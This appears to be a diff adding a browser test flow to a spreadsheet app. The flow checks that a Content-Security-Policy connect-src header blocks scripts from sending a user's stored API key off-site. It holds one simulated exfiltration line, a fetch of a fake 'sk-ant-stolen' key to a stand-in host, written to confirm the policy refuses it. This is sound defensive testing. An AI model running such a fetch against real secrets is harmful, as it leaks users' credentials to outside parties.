@@ -252,6 +252,42 @@ const FLOWS = [
     },
   },
   {
+    name: "the CSP is on, and it closes the exit that matters",
+    async run(page) {
+      // The AI assistant holds the visitor's own API key in sessionStorage, which means any script
+      // running in this page can read it. The policy cannot stop that; what it can stop is the step
+      // after — sending it somewhere. That claim is worth re-checking on every push, because a
+      // header is exactly the kind of thing that survives in the config and stops being served.
+      const header = (await page.goto(ORIGIN + "/app"))?.headers()["content-security-policy"] ?? "";
+      note(header.includes("connect-src"), `/app is served with a connect-src policy (${header.slice(0, 60) || "no header"}…)`);
+      note(header.includes("https://api.anthropic.com"), "and the BYOK path is in it, or the assistant would be broken by it");
+
+      const refused = await page.evaluate(async () => {
+        try {
+          await fetch("https://exfiltration.invalid/?k=sk-ant-stolen");
+          return false;
+        } catch {
+          return true;
+        }
+      });
+      note(refused, "a script cannot fetch a stolen key to an origin the policy does not name");
+
+      // A policy the app itself trips over gets switched off by whoever hits it next, so the app
+      // running clean under it is as much a part of the check as the blocking is.
+      const own = [];
+      page.on("console", (m) => {
+        if (/Refused to|Content Security Policy/i.test(m.text()) && !m.text().includes("exfiltration.invalid")) {
+          own.push(m.text().slice(0, 120));
+        }
+      });
+      await typeInCell(page, 0, 0, "10");
+      await typeInCell(page, 1, 0, "20");
+      await typeInCell(page, 2, 0, "=SUM(A1:A2)");
+      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "30");
+      note(own.length === 0, "and the app itself trips over none of it", own.join(" · "));
+    },
+  },
+  {
     name: "a change away from the cursor is announced",
     async run(page) {
       // This flow exists because of a bug exactly here: the toolbar's "+ row" called `addRow`,
